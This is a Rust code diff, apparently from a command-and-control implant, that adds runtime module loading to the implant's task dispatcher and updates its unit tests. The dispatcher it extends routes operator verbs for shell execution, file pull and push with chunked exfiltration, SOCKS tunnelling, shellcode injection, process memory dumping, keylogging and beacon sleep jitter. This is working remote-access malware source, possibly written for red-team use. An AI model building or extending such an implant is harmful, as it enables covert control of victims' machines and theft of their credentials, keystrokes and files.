@@ -2,6 +2,7 @@ use std::sync::{Arc, Mutex};
 
 use base64::Engine;
 
+use crate::plugins::Plugins;
 use crate::profile::parse_duration;
 use crate::wire::ExfilChunk;
 
@@ -19,7 +20,11 @@ pub type Cadence = Arc<Mutex<(f64, f64)>>;
 /// cfg'd whole: attributes do not apply to array elements. The channel verbs
 /// (shell.interact, tunnel.forward, tunnel.socks) are compiled on every
 /// platform -- their machinery lives in the channel layer, not the handler
-/// table, and dispatch routes them there.
+/// table, and dispatch routes them there. The module family is compiled on
+/// every platform too (architecture.md Sec 5.4): module.unload and
+/// module.list always answer, and module.load answers through the staged
+/// arm -- on a platform with no in-process loader it fails cleanly naming
+/// the boundary, which is the honest advertisement.
 #[cfg(windows)]
 pub const COMPILED_VERBS: &[&str] = &[
     "shell.exec",
@@ -31,6 +36,9 @@ pub const COMPILED_VERBS: &[&str] = &[
     "proc.kill",
     "tunnel.forward",
     "tunnel.socks",
+    "module.load",
+    "module.unload",
+    "module.list",
     "inject.shellcode",
     "collect.minidump",
     "collect.keylog",
@@ -47,6 +55,9 @@ pub const COMPILED_VERBS: &[&str] = &[
     "proc.kill",
     "tunnel.forward",
     "tunnel.socks",
+    "module.load",
+    "module.unload",
+    "module.list",
 ];
 
 /// One chunk per 512 KiB: comfortably under the frame-layer sizing budget
@@ -99,14 +110,29 @@ impl HandlerOutput {
 
 /// Dispatches one verb; an unknown verb fails with the grammar named rather
 /// than panicking -- the advertised set should have prevented it, and a
-/// failure the operator can read beats a dropped task.
-pub fn dispatch(verb: &str, arguments: &str, cadence: &Cadence) -> HandlerOutput {
+/// failure the operator can read beats a dropped task. The compiled table
+/// answers first, the plugin table second (architecture.md Sec 5.4): a
+/// module verb reads exactly like a compiled one.
+pub fn dispatch(
+    verb: &str,
+    arguments: &str,
+    cadence: &Cadence,
+    plugins: &Plugins,
+) -> HandlerOutput {
     match verb {
         "shell.exec" => shell_exec(arguments),
         "file.pull" => file_pull(arguments),
         "file.push" => file_push(arguments),
         "fs.list" => fs_list(arguments),
         "beacon.sleep" => beacon_sleep(arguments, cadence),
+        // The module family's one-shot verbs; module.load itself answers
+        // through the staged arm (the bytes ride the task's content).
+        "module.load" => HandlerOutput::fail(
+            "module.load stages its bytes as task content; issue it with the module as content"
+                .into(),
+        ),
+        "module.unload" => module_unload(arguments, plugins),
+        "module.list" => HandlerOutput::ok(plugins.list()),
         #[cfg(windows)]
         "proc.kill" => crate::sensitive::proc_kill(arguments),
         // The documented Unix administration path: TERM first, KILL if the
@@ -119,9 +145,27 @@ pub fn dispatch(verb: &str, arguments: &str, cadence: &Cadence) -> HandlerOutput
         "collect.minidump" => crate::sensitive::collect_minidump(arguments),
         #[cfg(windows)]
         "collect.keylog" => crate::sensitive::collect_keylog(arguments),
-        _ => HandlerOutput::fail(format!(
-            "{verb}: this build carries no handler for the verb"
-        )),
+        _ => match plugins.dispatch(verb, arguments) {
+            Some((outcome, output)) => HandlerOutput {
+                outcome,
+                output,
+                chunks: Vec::new(),
+            },
+            None => HandlerOutput::fail(format!(
+                "{verb}: this build carries no handler for the verb"
+            )),
+        },
+    }
+}
+
+fn module_unload(arguments: &str, plugins: &Plugins) -> HandlerOutput {
+    let name = arguments.trim();
+    if name.is_empty() {
+        return HandlerOutput::fail("module.unload expects '<name>'".into());
+    }
+    match plugins.unload(name) {
+        Ok(report) => HandlerOutput::ok(report),
+        Err(cause) => HandlerOutput::fail(cause),
     }
 }
 
@@ -329,6 +373,10 @@ mod tests {
         Arc::new(Mutex::new((30.0, 5.0)))
     }
 
+    fn dispatch(verb: &str, arguments: &str) -> HandlerOutput {
+        super::dispatch(verb, arguments, &cadence(), &Plugins::new())
+    }
+
     /// A per-test scratch directory under the system temp dir, removed on
     /// entry so reruns start clean.
     fn scratch(name: &str) -> std::path::PathBuf {
@@ -341,7 +389,7 @@ mod tests {
 
     #[test]
     fn unknown_verbs_fail_with_the_grammar_named() {
-        let out = dispatch("no.such.verb", "args", &cadence());
+        let out = dispatch("no.such.verb", "args");
         assert_eq!(out.outcome, Outcome::Failed);
         assert!(out.output.contains("no.such.verb"), "{}", out.output);
         assert!(out.chunks.is_empty());
@@ -350,14 +398,15 @@ mod tests {
     #[test]
     fn beacon_sleep_retunes_the_live_cadence() {
         let cadence = cadence();
-        let out = dispatch("beacon.sleep", "10s 1", &cadence);
+        let plugins = Plugins::new();
+        let out = super::dispatch("beacon.sleep", "10s 1", &cadence, &plugins);
         assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
         assert_eq!(*cadence.lock().unwrap(), (10.0, 1.0));
         // A missing jitter keeps the live one.
-        dispatch("beacon.sleep", "20", &cadence);
+        super::dispatch("beacon.sleep", "20", &cadence, &plugins);
         assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
         // Malformed tasking changes nothing.
-        let bad = dispatch("beacon.sleep", "1 2 3", &cadence);
+        let bad = super::dispatch("beacon.sleep", "1 2 3", &cadence, &plugins);
         assert_eq!(bad.outcome, Outcome::Failed);
         assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
     }
@@ -367,13 +416,9 @@ mod tests {
         let dir = scratch("transfer");
         let path = dir.join("note.txt");
         let payload = base64::engine::general_purpose::STANDARD.encode(b"rod unit");
-        let push = dispatch(
-            "file.push",
-            &format!("{} {}", path.display(), payload),
-            &cadence(),
-        );
+        let push = dispatch("file.push", &format!("{} {}", path.display(), payload));
         assert_eq!(push.outcome, Outcome::Succeeded, "{}", push.output);
-        let pull = dispatch("file.pull", path.to_str().unwrap(), &cadence());
+        let pull = dispatch("file.pull", path.to_str().unwrap());
         assert_eq!(pull.outcome, Outcome::Succeeded, "{}", pull.output);
         assert_eq!(pull.output, "rod unit");
         std::fs::remove_dir_all(&dir).ok();
@@ -386,7 +431,7 @@ mod tests {
         // One byte past the inline cap: the chunked path, in two full
         // chunks plus a one-byte terminal.
         std::fs::write(&path, vec![0u8; MAX_INLINE_BYTES + 1]).expect("blob");
-        let out = dispatch("file.pull", path.to_str().unwrap(), &cadence());
+        let out = dispatch("file.pull", path.to_str().unwrap());
         assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
         assert_eq!(out.chunks.len(), 3);
         assert_eq!(out.chunks[0].data.len(), CHUNK_BYTES);
@@ -400,16 +445,11 @@ mod tests {
 
     #[test]
     fn file_push_refuses_malformed_tasking() {
-        let cadence = cadence();
         for arguments in ["", "   ", "no-space-no-payload"] {
-            let out = dispatch("file.push", arguments, &cadence);
+            let out = dispatch("file.push", arguments);
             assert_eq!(out.outcome, Outcome::Failed, "{arguments}");
         }
-        let out = dispatch(
-            "file.push",
-            "certainly/not/a/path !!!not-base64!!!",
-            &cadence,
-        );
+        let out = dispatch("file.push", "certainly/not/a/path !!!not-base64!!!");
         assert_eq!(out.outcome, Outcome::Failed);
     }
 
@@ -418,7 +458,7 @@ mod tests {
         let dir = scratch("list");
         std::fs::write(dir.join("b.txt"), b"1").expect("file");
         std::fs::create_dir(dir.join("a")).expect("dir");
-        let out = dispatch("fs.list", dir.to_str().unwrap(), &cadence());
+        let out = dispatch("fs.list", dir.to_str().unwrap());
         assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
         let names: Vec<String> = out
             .output
@@ -438,13 +478,13 @@ mod tests {
         } else {
             "printf rod-unit"
         };
-        let out = dispatch("shell.exec", banner, &cadence());
+        let out = dispatch("shell.exec", banner);
         assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
         assert_eq!(out.output.trim(), "rod-unit");
-        let failed = dispatch("shell.exec", "exit 3", &cadence());
+        let failed = dispatch("shell.exec", "exit 3");
         assert_eq!(failed.outcome, Outcome::Failed);
         assert!(failed.output.contains('3'), "{}", failed.output);
-        let empty = dispatch("shell.exec", "   ", &cadence());
+        let empty = dispatch("shell.exec", "   ");
         assert_eq!(empty.outcome, Outcome::Failed);
     }
 }
